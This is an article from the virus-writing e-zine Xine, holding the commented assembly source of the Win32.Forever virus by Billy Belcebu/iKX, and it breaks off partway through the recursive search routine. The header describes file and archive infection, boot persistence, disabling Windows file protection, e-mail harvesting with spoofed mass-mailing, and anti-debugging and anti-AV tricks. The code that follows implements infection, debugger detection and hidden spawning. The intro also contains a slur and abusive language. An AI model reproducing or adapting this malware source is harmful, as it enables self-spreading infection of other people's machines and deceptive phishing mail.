
   ;                                             ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;                                             ³ Xine - issue #5 - Phile 205 ³
   ;                                             ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ





   ;
   ;ÄÄÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄ¿
   ; ÚÄÜÜÜÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄÙ        [ Win32.Forever    Billy Belcebu/iKX ]
   ; ÀÄÛÛÛÄÛÛÛÛÛÛÄÄÄÛÛÛÛÛÄÄ¿ ÚÄÄÄÄÄÄ[ 24496 bytes   Target - Win32 Ring3 ]ÄÄÄÄÄÄ
   ; ÚÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄÙ ³      [ 02/01/01 - Made in Valencia, Spain ]
   ; ÀÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄÛÛÛÄÄÄÙ
   ;
   ;
   ;
   ; [ Introduction ]
   ;
   ; After many months lost in my studies,my personal problems, and playing with
   ; Half-Life in a LAN (hi Winter, nIgr0 & Tcp!),i'm here to present the newest
   ; creature from me. I think i have changed a bit my way of code since my last
   ; published virus, as i don't  give a shit now about structural optimization,
   ; and such like fool things;as i've been infected 3 or 4 times with different
   ; viruses (my pirate  is a great target  for them, so  i am), i realized that
   ; i had to guide my steps  to fast-spreading. For  example, i've got infected
   ; with Kriz, CIH and my  PoshKiller (without realizing  in a whole day), i've
   ; seen  that, meanwhile  Kriz didn't infected  a shit (although i had to kill
   ; windows), CIH was a  bit faster  but very unstable (fact  that make me know
   ; at the fucking moment when i was infected); my PoshKiller was the most sta-
   ; ble, fast and the one  that persisted more in  my system (anyway i realized
   ; the bug with CPL files, so there is a new version (1.01) of it). The Ring-0
   ; viruses are the fastest ones  in this side  of the universe, they replicate
   ; as bastard  motherfuckers, but only in Win9x  enviroments; so its  targeted
   ; systems are very limited, and  have  counted their  days (Win2k is here  to
   ; stay),so Ring-3  viruses seem the  solution. In  fact, they can  have  good
   ; fast-spreading abilities, but the recursive scan is rather slow. Some solu-
   ; tions to this problem are brought by this virus, so take a look at it! Dont
   ; expect many innovations among this  virus: i've done it only  for spread, i
   ; don't want any risk  derivated of brand new techniques; for that reason i'm
   ; making other viruses. Every virus has  a purpose, understand it. Also, this
   ; virus is my first one using some includes, for reasons of understandability
   ; of the code ;) The ZIP infection  routines are  from StarZer0, and the  CAB
   ; one is from Prizzy. Greets here to them. Well, i'm still  more  proud of my
   ; Win32.Legacy, for  example, but  this  virus marks  a new start in my viral
   ; objectives. And it's so fucking big, and spreadable :P This virus initially
   ; had EPO features, but due some very strange bugs, it was removed on purpose
   ; until i found the fucking bug. Blah, who cares. This  have been very boring
   ; to be finished at all, but finally here is it! :)
   ;
   ; Coz the lack of motivation and shits of my personal life, some  bugs may be
   ; bypassed... anyway don't worry, if  any bug  found  it will be solved for a
   ; futurible next version.
   ;
   ; [ Behaviour ]
   ;
   ; When the virus arrives on a new system, it acts in two parts:
   ;
   ; 1) First execution of the virus
   ;
   ; The virus will  infect every  infectable file at \WINDOWS, \WINDOWS\SYSTEM,
   ; and the current directory;it will drop an infected file at SYSTEM directory
   ; named REVEROF.EXE (with hidden, R/O and  system attributes), will make some
   ; changes  on  the  registry (for windows  boot-up execution), and  will stay
   ; infecting by means of a normal  runtime Win32 Ring3  virus. The virus  will
   ; disable SFC forever (in Win2k at least).
   ;
   ; 2) Windows boot-up when the virus is already there
   ;
   ; Oh, here comes the  funniest stuff ;) The virus will be  executed just when
   ; Windows has boot-up, and  will begin the "spawning" state. The  virus  will
   ; have its  own process (registered as  system process in Win9x) and  it will
   ; begin a recursive search through  all units and all directories of the inf.
   ; computer, infecting everything infectable. Also, if it finds some HTM? file
   ; or a Windows Address Book file (WAB) it'll  analyze it searching for e-mail
   ; addresses, and if it finds some of them, the virus will send  there  a copy
   ; of the virus. Also, the virus will delete all the integrity files of the HD
   ;
   ; [ Poly ]
   ;
   ; The poly is a new revision of my MMXE. I've realized its garbage engine was
   ; the worst kind of garbager  never seen, so i've added many more garbage. Of
   ; course, it's still limited (believe me, i'm preparing a new engine with one
   ; of the best garbagers you've ever seen) but it's because the engine concept
   ; itself. I am too lazy to recode it, so  i try  to patch  its  hughest fails
   ; step by step. Bah, the  poly doesn't need to be  powerful in a virus of the
   ; features of this, but it helps for conceal the code to the  curious eyes ;)
   ; It's not the best at  any field, but it intends to be spreadable. About the
   ; poly itself, see the previous versions of MMXE for a full description, as i
   ; have not changed the behaviour of the engine at all.
   ;
   ; [ I-Worm ]
   ;
   ; This  virus  uses captabilities  of the i-worms for mega-spreading. It will
   ; send a fake mail with an  infected attachment to every e-mail address obta-
   ; ined from the two ways implemented:
   ;
   ;       1. E-mails found into HTM? files (searching for "mailto:")
   ;       2. E-mails in the WAB files, even from Outlook 5.5 - (c) LifeWire/iKX
   ;
   ; This provides us an overwhelming power :) The virus implements its own SMTP
   ; client engine, whick gives us  a more reliable &  stealthy way for  sending
   ; e-mails to the people we want  to infect, as  well as we can spoof the MAIL
   ; FROM field, making the  user believe  that  it really comes from Micro$oft.
   ; We take the SMTP server name from  the registry (from the default account),
   ; and if these keys doesn't  exist, it's  able  to use  some harcoded spanish
   ; SMTP servers.
   ;
   ; This part of the virus will  only work  when we're on spawning stage, so in
   ; the first run of the virus in  an infected  system won't work  at all. Just
   ; wait for the  next reboot and  let's play :) We won't  resend the  virus to
   ; an  already  used target, as  it stores  the CRC32 in  an special file (our
   ; personal address  book, in the C:\REVEROF.SYS file); anyway  and for  avoid
   ; problems and allow more fun, we delete that  address book when  the payload
   ; is activated, so we can resend the virus again and again :)
   ;
   ; Send mail procedures are dessigned with an intelligent usage of threads, id
   ; est, we earn time and handle as good as possible this critical stage of the
   ; virus, as we  want  to remain  as stealthy  as  possible. First we create a
   ; thread with the lowest priority, that only  awaits till we're  connected to
   ; internet, and when this happens, it sets the thread to the highest priority
   ; and creates another thread with highest  priority: the one that handles the
   ; SMTP client itself.This thread has 60 seconds to perform all its operations
   ; When that time passes, the  virus terminates the thread, as we take this as
   ; a timeout error. Nice, heh? :)
   ;
   ; [ Payload ]
   ;
   ; Mwaha! The payload, of  course, is not  destructive. It consist in a trojan
   ; dropping; the trojan is a little shitty program with an icon asociated,that
   ; will only show you the lyrics of the song that gives its name to this virus
   ; But what's funny is when it is dispayed ;) The trojan is dropped in all the
   ; root directories of all the  fixed drives (HDs), and is also dropped a cool
   ; file called autorun.inf; this  will make  a funny  effect when the infected
   ; user tries to access the root drive from Windoze's explorer ;) The AutoWorm
   ; made by Murkry uses a similar principle, but  his wormy spreads itself, and
   ; mine don't, it's just a payload :)
   ;
   ; [ Features ]
   ;
   ;       + Focused to megainfection and fast spreading, genuine ITW virus.
   ;       + Drops a copy of itself into ZIP, CAB, ARJ, RAR files
   ;       + Infects also BAT files (slow as hell, but who cares anyway...)
   ;       + A virus dropper will be surely executed at Windoze boot-up
   ;       + Recursive directory infection only every windows boot-up, that will
   ;         infect across all the fixed and remote drives of the computer
   ;       + Win32 Spawning virus features (file at startup runs infecting all
   ;         at background, the process is registered as "system", etc)
   ;       + WinMe/NT/2k full compatibility (SFC, CheckSum, etc)
   ;       + Disable System File Protection if we're under Win2k (in next reboot)
   ;       + E-mail spreading with its own SMTP client engine
   ;       + Uses threads for an unnoticeable mega-spreading
   ;       + Highly antidebugging (DR?,SiCE detect & fuck,IsDebuggerPresent,etc)
   ;       + Anti-AV in Win9x (KILLAVXD code by Z0MBiE)
   ;       + Anti-Emulation features
   ;       + Avoid the infection of certain files
   ;       + Polymorphism with MMXE v1.02
   ;       + Incurability (by means of an optimized UVE-alike engine) - Hi Qozah!
   ;       + .reloc overwriting (the infected file doesn't grow so much)
   ;       + Wipes the integrity check files from all the system HDs.
   ;       + A nice and annoying payload, playing with autorun files.
   ;
   ; [ Platforms ]
   ;
   ;       + Win95         - Tested. Worked perfectly.
   ;       + Win95 OSR2    - Tested. Worked perfectly.
   ;       + Win98         - Tested. Worked perfectly.
   ;       + Win98 S.E.    - Tested. Worked perfectly.
   ;       + WinNT 4       - Not tested. It's supposed to work there too :)
   ;       + Win2000 PRO   - Tested. Worked perfectly.
   :       + WinME         - Tested. Worked perfectly.
   ;
   ; [ How to build it ]
   ;
   ;       TASM32 /m3 /ml FOREVER.ASM,,;
   ;       TLINK32 /Tpe /aa FOREVER,FOREVER,,IMPORT32.LIB
   ;       PEWRSEC FOREVER.EXE
   ;
   ; [ Thanx ]
   ;
   ;       + StarZer0, LifeWire, Int13h, Prizzy, Z0MBiE, ULTRAS, Qozah, Asmodeus
   ;         Bumblebee, GriYo
   ;
   ; [ Greetings ]
   ;
   ;       VX related people:
   ;       + StarZer0      - U master! Yez, Fede is a g0d, but aren't u too? :)
   ;       + b0z0          - We love metal, man [:)
   ;       + Murkry        - Nice to know about your creator... ;)
   ;       + n0ph          - I want to code for your assembler :P
   ;       + Asmodeus      - Moridin & Forever... iKX megaspreading style! X-D
   ;       + Vital         - I like yer coding style... neato, neato :)
   ;       + LifeWire      - Thanx for your help in some parts of this beast :P
   ;       + Int13h        - Bonita postal ;)
   ;       + Benny         - Do the meeting in Spain!
   ;       + Vecna         - gracias por el honor de leer un virus mio cagando ;)
   ;       + VirusBuster   - La maruja virtual X-D
   ;       + GriYo         - En Documentos TV... ke lujo, joer!
   ;       + Qozah         - This babe uses your tech :)
   ;       + Wintermute    - I want Old Tomorrow's Party! ;) Btw, NIN rlz!!!
   ;       + Rydell        - Joer, 3 greets ya es pasarse :P
   ;       + MrSandman     - Nice to chat with ya... Tarantino is the master!
   ;       + nIgr0         - William Gibson is our common g0d: Idoru rulez!
   ;       + Tcp           - Still the last at Half-Life? ;)
   ;       + Super         - ¨Sigues practicando la c0pr0fagia con nIgr0?
   ;       + Bumblebee     - Nice stuff dude... (asias x soluzionar mis bugs!)
   ;       + Gatito        - Hey, do u like NuKE dudez, heh? ;) Miau!
   ;       + Kamaileon     - Nice dude, thnx for yer "list" :]
   ;       + Prizzy        - Nice work with CABs... that's why i borrowed it :)
   ;       + Mandragore    - Chocolate & beer... simple things makes me happy X-D
   ;       + Ypsilon       - El VX mas productivo que conozco (irony rulez!) :P
   ;       + T-2000        - We must exterminate catholicism!
   ;       + Rajaat        - my darkest black-metal friend? >:)
   ;       + YbY           - Uy, tu nick sale aki! :) Plugin r00lz da w0rld! X-P
   ;       + somniun       - oh mi diosa! para cuando un virus win32 tuyo? :)
   ;       + DrOwlFS       - nice to have news of u!!!
   ;       + Ultras        - Hi u there! Thanx for yer greets in MTX#2 :)
   ;
   ;       Groups:
   ;       + iKX           - We rocked, rock and will rock forever!!! :)
   ;       + 29A           - I don't know this group... Heh? :P
   ;       + DDT           - It is officially dead as group, but not in my heart.
   ;       + [MATRiX]      - A really nice group!
   ;       + All the rest  - Oh, had i forget u? Sorry! It's cause drugz! :*)
   ;
   ;       Other people:
   ;       + Potro         - I made u HIM-MANIAC! Thanx for your support always
   ;       + Frontis       - Fuck! I like yer BIG collection of DIVX movies! :P
   ;       + Sephirot      - You're better than me in CS... Well, sometimes :)
   ;       + Kornholyo     - Oh my god, they killed Kenny! :)
   ;       + HoRuS,LuCiFeR - EHH? OH!!! TE LOS VAS A KOMER TE LOS VAS A KOMER!!!
   ;       + FearDark      - i am the man who walks alone...
   ;       + Morete        - Tas desaparesio tiu... :(
   ;       + Duri          - U made me a Scorpion's fan... SLY!
   ;       + Teinna        - a kiss for u :) zoi tu wardaezpaldaz, ein?
   ;       + Izumi         - you r0ck, darling ! :)
   ;       + emi           - wapaaaaaaaaaaaaaaaaaaaaaaaaa
   ;       + Virgin        - Thanx for my 3210, but still u r a FAT BASTARD!!!!!
   ;       + All the other niggas friends of mine... you rule!! :)
   ;
   ; An special greet to my CD toaster, because the  good times passed together.
   ; Also to William  Gibson for  his books, and Thomas Harris for  create  that
   ; character called Hannibal Lecter, that motivates me a lot :)
   ;
   ; Also, i  never forget  those people that fight for  achieve a better world.
   ; Remember, you are not alone!
   ;
   ; [ Why this name? ]
   ;
   ; Well, Forever is a song (how not) of  Stratovarius, that you  can  find  in
   ; their album 'Episode'. It's also in the  album 'The Chosen Ones' and in the
   ; live album 'Visions of Europe'. It's a  ballad, very short compared  to any
   ; other song of Stratovarius, but it's  very emotive and i love it (hey, i've
   ; a romantic side too ;) It makes me remind of  a girl... a very special girl
   ; for me. You know about what i am talking about, right? ;)
   ;
   ; FOREVER - (The song) :)
   ; ÄÄÄÄÄÄÄ
   ;
   ; I stand alone in the darkness
   ; the winter of my life came so fast
   ; memories go back to my childhood
   ; to days i still recall
   ;
   ; Oh how happy i was then
   ; there was no sorrow, there was no pain
   ; walking through the green fields
   ; sunshine in my eyes
   ;
   ; I'm still there everywhere
   ; I'm the dust in the wind
   ; I'm the star in the northern sky
   ; I never stayed anywhere
   ; I'm the wind in the trees
   ; Would you wait for me... forever?
   ;
   ; [ Dedications and fuck-offs ]
   ;
   ; This program is dedicated to all the  people who fight for achieve a better
   ; world; also to  all the  virusmakers around, all  the marxists (and whose i
   ; share ideas of any kind) and to all my friends over the world.The fuck-offs
   ; go to all the scum who don't deserve its  own  existence: all the fascists,
   ; intolerant,arrogant and posh people.I sincerely hope this virus will infect
   ; all those despreciable kind of people. It's not destructive anyway. It just
   ; will threat them. Panic will do the rest.
   ;
   ; Up the irons!
   ;
   ; (c) 1999-2000-2001 Billy Belcebu/iKX        [ http://www.billybelcebu.org ]

   ;------------------------------[ FOREVER.ASM ]------------------------------;

   ;############################################################################
   ;# WIN32.FOREVER                                 (c) 2000 Billy Belcebu/iKX #
   ;############################################################################

   ; "Una mente puede ser mal‚fica sin tener que ser anormal"
   ;                                           - Dennis Nilsen (a serial killer)


           .586p
           .model  flat,stdcall

   display " [ Win32.Forever ] - [ Billy Belcebu [iKX] ] - [ Win32.Forever ] "

   extrn   MessageBoxA:PROC
   extrn   ExitProcess:PROC

           .data

           include forever.inc

   ; Virus mode switches

   debug           =       false
   spread          =       false
   winboot         =       true

   ; Hehehehehehe ;)

           if      spread

   szMsg   db      "Fatal Error",0
   szTtl   db      "File MSVCRT6.DLL not found in the system directory",10
           db      "Please reinstall the product from its original package",10
           db      "or contact your provider fore more info.",0

           else

   szMsg   db      "Win32.Forever",0
   szTtl   db      "First generation host",10
           db      "Viral Size : "
           db      virus_size/10000 mod 10 + "0"
           db      virus_size/01000 mod 10 + "0"
           db      virus_size/00100 mod 10 + "0"
           db      virus_size/00010 mod 10 + "0"
           db      virus_size/00001 mod 10 + "0"," - "
           db      "Virtual Size : "
           db      total_size/10000 mod 10 + "0"
           db      total_size/01000 mod 10 + "0"
           db      total_size/00100 mod 10 + "0"
           db      total_size/00010 mod 10 + "0"
           db      total_size/00001 mod 10 + "0",10

   ; Put some miscellaneous information

           if      debug
           db      "- DEBUG MODE/SAFE MODE -",10
           elseif
           db      "!!!DEBUG MODE DISABLED!!!",10
           endif

           if      winboot
           db      "!!!WINBOOT MODE ENABLED!!!",10
           endif

           if      debug
           else
           if      winboot
           db      "[TOTAL RETALIATION MODE ACTIVATED]",10
           endif
           endif

           db      "(c) 1999-2000 Billy Belcebu/iKX",0

           endif


   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   ; % First generation fake host                                              %
   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

   ;  Don't fear the reaper, baby

   firstgen:
           call    MessageBoxA,00h,offset szTtl,offset szMsg,1010h
           call    ExitProcess,-1

           .code

   ; Marilyn Manson  Slipknot
   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ  ÄÄÄÄÄÄÄÄ
   ; KILL YOUR GOD   FUCK IT ALL FUCK THIS WORLD FUCK EVERYTHING THAT U STAND FOR
   ; KILL YOUR TV    DONT BELONG DONT EXIST DONT GIVE A SHIT DONT EVER JUDGE ME

   _1stgencode:

   virus_start     =       $

   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   ; % Virus entrypoint                                                        %
   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

   forever:

           db      LIMIT dup (90h)                 ; Here comes the poly

   ; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
   ; This piece of code uses the great idea that my very good friend Qozah had,
   ; about the possible incurability of viruses... So, let's standarize that
   ; method... The way is using it! PS: Unreal rulez...
   ;
   ; The thing is simple, we're gonna put here 7 MOVs with all 32 bit registers
   ; (except ESP for obvious reasons). If the first opcode of the infected file
   ; was a MOV reg32,? it will be here in a random place, mixed with 6 more MOVs
   ; with fake values. Also, it doesn't matter if the first opcode was not a MOV,
   ; as here will be 7 fake MOVs. So, the AV won't be able to know what opcode
   ; was the legit, and what was the fake one. Interesting :)
   ; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

   incurable:
           db      07h*05h dup (90h)               ; Space for fake/legit instr.

   ; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

           push    eax                             ; Reserve space on stack

           pushad

   ; Below code make heuristics yell as hell, let's kill'em before then ;)

           call    MakeFault
           mov     esp,[esp+08h]
           jmp     real_start
   MakeFault:
           xor     edx,edx
           push    dword ptr fs:[edx]
           mov     dword ptr fs:[edx],esp

           div     edx                             ; b00m!

           db      0EAh

   real_start:
           xor     edx,edx                         ; Quit SEH frame
           pop     dword ptr fs:[edx]
           pop     edx

           call    annoy@@1                        ; Hiya LifeWire!
           db      0FFh

           call    GetDeltaOffset                  ; Hmmm... this is innovative :P
           db      067h

           call    annoy@@1
           db      0C7h

           call    SetFrameSEH                     ; Set the new SEH handler

   ; This is the main SEH handler of the virus. If something goes wrong, we'll
   ; end here (sigh, i don't want that) :)

           mov     esp,[esp+8]                     ; ESP must be restored
           call    GetDeltaOffset                  ; We need to get d-ofs again
           db      066h
           jmp     ByeByeVirus

           db      0E8h                            ; Annoy is da word.

   SetFrameSEH:
           xor     edx,edx                         ; Set-Up a new SEH frame
           push    dword ptr fs:[edx]
           mov     dword ptr fs:[edx],esp

           call    annoy@@1
           db      0EAh

           call    $+5                             ; Get process modulebase
           pop     esi                             ; (bugfix!)
           push    05h
           pop     ecx
           call    CheckImageBase
           mov     dword ptr [ebp+ModBase],esi

   ; Here EDX = 0

           mov     esi,[esp+2Ch]                   ; Get return address
           push    05h                             ; Search Limit (*10 pages)
           pop     ecx
           call    CheckImageBase
   PutOSx: or      ecx,ecx
           jz      ByeByeVirus
           cmp     esi,kernel_w9x                  ; Now check if we know the
           jz      PutOS                           ; running OS...
           inc     edx
           cmp     esi,kernel_wNT
           jz      PutOS
           inc     edx
           cmp     esi,kernel_w2k
           jz      PutOS
           inc     edx
           cmp     esi,kernel_wMe
           jz      PutOS
           inc     edx

   PutOS:  mov     dword ptr [ebp+kernel],esi
           mov     byte ptr [ebp+running_os],dl

           cmp     dl,running_w9x
           jnz     w32_infection

           pushad
           call    VxDFix                          ; Fix all VxDCalls ;)
           call    w9x_specific                    ; Ring-0 module
           popad

           mov     ecx,fs:[20h]                    ; This don't work in Win2k
           jecxz   w32_infection

           cli
           jmp     $-1

   w32_infection:
           lea     eax,[ebp+api_list]              ; Let's detect all the needed
           xchg    eax,esi                         ; APIs :)
           lea     edi,[ebp+api_addresses]
           call    GetAPIs

   ; Now check if we're already present (probably spawning) ;)

           call    ovrmrk

   ; Also, this is the id mark of the virus :)

   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
           db      "Win32.Forever",00h,"(c) 2000 Billy Belcebu/iKX",00h ;      ³
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   ovrmrk: push    01h                             ; If the mutex already exist,
           push    00h                             ; it means that the virus is
           apicall CreateMutexA                    ; already being run.
           apicall GetLastError
           or      eax,eax
           jnz     ByeByeVirus

       lea     edi,[ebp+random_seed]           ; Initialize slow random seed
       push    edi
           apicall GetSystemTime

   ;ÄÄÄ[ AntiSoftICE ]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

           and     byte ptr [ebp+SoftICE],00h      ; For avoid problemz

           if      debug

   ; Me toco los cojones... X-D

           else


   DetectSICE:
       lea     edi,[ebp+Drivers2Avoid]
   SearchDriverz:
       xor     eax,eax                         ; This little trick allows
       push    eax                             ; us to check for drivers,
           push    80h                             ; so we can check for our
           push    03h                             ; beloved SoftICE in its
           push    eax                             ; Win9x and WinNT versions...
       inc     eax
       push    eax
           push    0C0000000h
       push    edi
           apicall CreateFileA

       inc     eax
       jz      NoDriverFound
       dec     eax

   ; If we arrived here is because SoftICE is there... So, we won't infect any
   ; file :)

       push    eax
           apicall CloseHandle

       inc     byte ptr [ebp+SoftICE]

   NoDriverFound:
           xor     al,al                           ; Get another driver :)
           scasb
           jnz     $-1

           cmp     byte ptr [edi],0BBh
       jnz     SearchDriverz

           cmp     dword ptr [ebp+IsDebuggerPresent],00h
           jz      ContinueTests

   ;ÄÄÄ[ AntiAppDebuggers ]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

           apicall IsDebuggerPresent
           xchg    eax,ecx
           jecxz   ContinueTests

           cli                                     ; Auto-hanger :P
           call    $-1

           endif

   ContinueTests:

   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   ; Put the switches in the right places :)

           if      debug
           mov     byte ptr [ebp+switch],090h
           mov     byte ptr [ebp+switch2],090h
           else
           mov     byte ptr [ebp+switch],0C3h      ; Don't allow e-mail spread yet
           mov     byte ptr [ebp+switch2],0C3h
           endif

           mov     byte ptr [ebp+BAT_switch],090h

           cmp     dword ptr [ebp+kernel],kernel_w2k
           jnz     over_KillSFC

           call    KillSFC                         ; This is soooooo nice :)

   over_KillSFC:
           call    SMTPInitClient                  ; Get SMTP server name
           mov     dword ptr [ebp+SMTPNamePtr],esi

   ; Here begins the genuine infection's dance...

           lea     edi,[ebp+current_dir]           ; Save current directory to
           push    edi                             ; a temp variable
           push    MAX_PATH
           apicall GetCurrentDirectoryA

           lea     edi,[ebp+infect_dir]
           push    MAX_PATH
           push    edi
           apicall GetWindowsDirectoryA
           call    SetNewDir&InfectFilesInDirectory

           lea     edi,[ebp+infect_dir]
           push    MAX_PATH
           push    edi
           apicall GetSystemDirectoryA
           call    SetNewDir&InfectFilesInDirectory

           lea     edi,[ebp+current_dir]
           push    edi
           apicall SetCurrentDirectoryA
           call    InfectFilesInDirectory

   ; Well, now check if we have to spawn :)

           lea     esi,dword ptr [ebp+HostName]
           push    esi
           push    00h
           apicall GetModuleFileNameA

   ; Convert string to uppercase

           call    ToUpperCase

   loopit:                                         ; REVEROF.EXE
           lodsb
           test    al,al
           jz      ItIsNotDropper

           cmp     dword ptr [esi],"EVER"          ; Paranoia!
           jnz     loopit
           cmp     dword ptr [esi+4],".FOR"
           jnz     loopit
           cmp     dword ptr [esi+7],"EXE."
           jnz     loopit

   ;ÄÄÄ[ Spawning ]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ


           cmp     byte ptr [ebp+running_os],running_w9x
           jnz     AvoidHideProcess

           push    01h                             ; Blah, in NT this don't work
           push    00h                             ; at all... register spawned
           apicall RegisterServiceProcess          ; copy as a process, so it
                                                   ; won't appear at the taskmon
   AvoidHideProcess:
           mov     byte ptr [ebp+switch],090h      ; Allow e-mail spreading :)
           mov     byte ptr [ebp+switch2],090h

           if      debug                           ; The debug action :)
           push    0
           pushs   "Win32.Forever"
           pushs   "W4RN1NG - T0T4L R3T4L14T10N 4CT1V4T3D"
           push    0
           apicall MessageBoxA_
           endif

   ; Launch as a thread the recursive search

       xor     edx,edx

           call    over_tid
           dd      ?                               ; lpThreadId
   over_tid:
       push    edx                             ; dwCreationFlags
       push    ebp                             ; lpParameter
           lea     eax,[ebp+RecursiveSearch]
       push    eax                             ; lpStartAddress
       push    edx                             ; dwStackSize
       push    edx                             ; lpThreadAttributes
           apicall CreateThread

           or      eax,eax                         ; Error?
           jz      ErrorCreatingThread             ; Damn...

           xchg    eax,edi

   ; Now set its priority to low coz we don't want to be so noticeable :)

           push    -1                              ; Set priority to low
           push    edi                             ; (but not t00 much ;)
           apicall SetThreadPriority

   ; We must wait all the time we need, guyz, WE'RE SPAWNED ;)

       xor     eax,eax                         ; Wait infinite seconds until
           dec     eax                             ; thread is finished
       push    eax                             ; Push -1
           push    edi                             ; Push thread handle
           apicall WaitForSingleObject

   ErrorCreatingThread:
           jmp     ByeByeVirus

   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   ItIsNotDropper:
           call    ReleaseDropper                  ; Put the infected dr0pper
           call    BuildWinBootVirusCopy           ; Prepare the b00t-up virus
           call    KillDropper                     ; Hide our steps ;)

   ByeByeVirus:

   QuitFrameSEH:
           xor     edx,edx
           pop     dword ptr fs:[edx]
           pop     edx

           mov     eax,(00400000h)
   ModBase =       $-4
           add     eax,offset firstgen-400000h
   OldEIP  =       $-4

           mov     [esp.RetAddress],eax            ; Pffffff....
           popad
           ret

           db      "Baby, join me in death..."     ; One of my favouritez: HIM

   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   ; % Search files by wildcards (Ring-3 runtime method)                       %
   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

   SetNewDir&InfectFilesInDirectory:
           lea     edi,[ebp+infect_dir]            ; This will set the wanted dir
           push    edi                             ; and will infect files there
           apicall SetCurrentDirectoryA

   InfectFilesInDirectory:
           lea     eax,[ebp+WIN32_FIND_DATA]       ; Search for files
           push    eax
           lea     eax,[ebp+SEARCH_MASK]
           push    eax
           apicall FindFirstFileA
           mov     dword ptr [ebp+SearchHandle],eax

           inc     eax
           jz      FailOccured

   SearchForMore:
           push    dword ptr [ebp+ModBase]         ; Preserve untouchable info
           push    dword ptr [ebp+OldEIP]

           lea     ebx,[ebp+WFD_szAlternateFileName]
           lea     edi,[ebp+WFD_szFileName]        ; Is the file found factible
           push    edi                             ; of being infected?
           call    ProcessExtension
           pop     edi
           jecxz   NotThisTime                     ; Nopes.

           dec     ecx
           jecxz   ItIsPE
           dec     ecx
           jecxz   ItIsArchive
           dec     ecx
           jecxz   ItIsWeb

   ItIsWAB:
           call    AnalyzeWAB                      ; It was a WAB file
           jmp     NotThisTime

   ItIsWeb:
           call    AnalyzeHTM                      ; It was a HTM* file X-D
           jmp     NotThisTime

   ItIsArchive:
           call    InfectArchive                   ; It was an archive
           jmp     NotThisTime

   ItIsPE: call    InfectPE                        ; It's a PE executable

   NotThisTime:
           pop     dword ptr [ebp+OldEIP]          ; Restore this interesting
           pop     dword ptr [ebp+ModBase]         ; info

           lea     edi,[ebp.WIN32_FIND_DATA]       ; Fill this with zeroes
           mov     ecx,WFD_Size
       xor     al,al
           push    edi
           rep     stosb                           ; Search for more filez :)
           push    dword ptr [ebp+SearchHandle]
           apicall FindNextFileA

           or      eax,eax
           jnz     SearchForMore

   CloseSearchHandle:
           push    dword ptr [ebp+SearchHandle]
           apicall FindClose
   FailOccured:
           ret

           db      "greetz to s0, b0z0, vital, lifey, asmody, murkry, n0ph..."
           db      "i.e., all the iKX family... "

           db      0FFh

   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   ; % Recursive file search (Ring-3 tricky fast spreading)                    %
   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

   ; This piece of code is only executed when we're on spawning stage. It's
   ; launched as a thread with a priority below normal because we don't want it
   ; to suck too much resources from the computer, ie make it less noticeable to
